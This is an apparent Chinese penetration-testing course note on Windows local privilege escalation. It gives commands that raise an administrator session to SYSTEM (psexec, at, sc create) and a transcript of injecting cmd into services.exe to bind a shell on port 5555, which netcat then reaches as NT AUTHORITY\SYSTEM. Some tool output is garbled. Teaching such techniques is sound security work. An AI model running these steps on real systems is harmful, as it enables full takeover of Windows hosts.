@@ -1,0 +1,109 @@
+课时44 本地提权
+
+╋━━━━━━━━━━━━╋
+┃本地提权                ┃
+┃已实现本地低权限账号登录┃
+┃   远程溢出             ┃
+┃   直接获得账号密码     ┃
+┃系统获取更高权限        ┃
+┃   实现对目标进一步控制 ┃
+╋━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━╋
+┃本地提权                                ┃
+┃系统账号之间权限隔离                    ┃
+┃    操作系统安全的基础                  ┃
+┃    用户空间                            ┃
+┃    内核空间                            ┃
+┃系统账号                                ┃
+┃    用户账号登陆时获得权限令牌          ┃
+┃    服务账号无需用户登录已在后台启动服务┃
+╋━━━━━━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━╋
+┃本地提权                ┃
+┃Windows                 ┃
+┃    user                ┃
+┃    Administrator       ┃
+┃    System              ┃
+┃Linux                   ┃
+┃    User                ┃
+┃    Root                ┃
+╋━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃ADMIN提权为SYSTEM                                                   ┃
+┃Windows system账号                                                  ┃
+┃    系统设置管理功能                                                ┃
+┃    Syslnternal Suite                                               ┃
+┃        http://technet.microsoft.com/en-us/sysinternals/bb545027    ┃
+┃        psexec -i -s -d taskmgr                                     ┃
+┃    at 19:39 /interactive cmd                                       ┃
+┃    sc Create syscmd binpath="cmd /k start" type=own type=interact  ┃
+┃    sc start syscmd                                                 ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+C:\windows\system32>at 19:39 /interactive cmd
+
+C:\windows\system32> sc Create syscmd binpath="cmd /k start" type=own type=interact
+
+C:\windows\system32>sc start syscmd
+
+C:\>PsExec.exe -i -s cmd
+
+C:\>pinjrvyot.exe
+Provilege Seiteher for Win32<Private version>
+<e> 2006 Andres Tarasco - atarassco@gmail.com
+
+Usage:
+ inject.exe -l                    <Enumerate Credentials>
+ inject.exe -p <pid> <cmd> <port> <Inject into PID>
+
+C:\>pinjrvyot.exe -l
+Provilege Seiteher for Win32<Private version>
+<e> 2006 Andres Tarasco - atarassco@gmail.com
+
+PID    480 smss.exe  < 3 Threads>  USER: \\NT AUTHORITY\SYSTEM
+PID    588 csrss.exe < 11 Threads>  USER: \\NT AUTHORITY\SYSTEM
+PID    612 winloggin.exe < 17 Threads>  USER: \\NT AUTHORITY\SYSTEM
+PID    656 services.exe < 15 Threads>  USER: \\NT AUTHORITY\SYSTEM
+PID    668 lass.exe < 21 Threads>  USER: \\NT AUTHORITY\SYSTEM
+PID    828 VBoxService.exe < 8 Threads>  USER: \\NT AUTHORITY\SYSTEM
+PID    872 svhost.exe < 20 Threads>  USER: \\NT AUTHORITY\SYSTEM
+PID   1042 svhost.exe < 50 Threads>  USER: \\NT AUTHORITY\SYSTEM
+   001540: \\NT AUTHORITY\SYSTEM
+   001584: \\NT AUTHORITY\SYSTEM
+PID   1544 spoolsv.exe < 10 Threads>  USER: \\NT AUTHORITY\SYSTEM
+PID   1180 Sladmin.exe < 5 Threads>  USER: \\NT AUTHORITY\SYSTEM
+PID   1421 SLSmtp.exe < 19 Threads>  USER: \\NT AUTHORITY\SYSTEM
+PID   1980 explorer.exe < 3 Threads>  USER: \\NT AUTHORITY\SYSTEM
+PID   1352 explorer.exe < 13 Threads>  USER: \\xp\yuanfu
+PID    580 VBoxTray.exe < 7 Threads>  USER: \\xp\yuanfu
+PID    172 ctfmon.exe < 1 Threads>  USER: \\xp\yuanfu
+PID    888 conime.exe < 1 Threads>  USER: \\xp\yuanfu
+PID   1460 cmd.exe < 1 Threads>  USER: \\xp\yuanfu
+PID   1732 pinjector.exe < 1 Threads>  USER: \\xp\yuanfu
+
+C:\>pinjrvyot.exe -p 656 cmd 5555
+Provilege Seiteher for Win32<Private version>
+<e> 2006 Andres Tarasco - atarassco@gmail.com
+
+[+] Trying to execute cmd to 656 as: ? \
+[+] Code inyected... : >
+
+C:\Documents and Settings\yuanfh>netstat -na0 | find "555"
+   TCP   0.0.0.0:5555          0.0.0.0:0              LISTENING       656
+
+root@kali:~# nc -nv 192.168.1.119 5555
+
+C:\WINDOWS\system32>whoami
+whoami
+NT AUTHORITY\SYSTEM
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃注入进程提权                                      ┃
+┃隐蔽痕迹                                          ┃
+┃pinjector.exe                                     ┃
+┃http://www.tarasco.org/security/Process_Injector/ ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
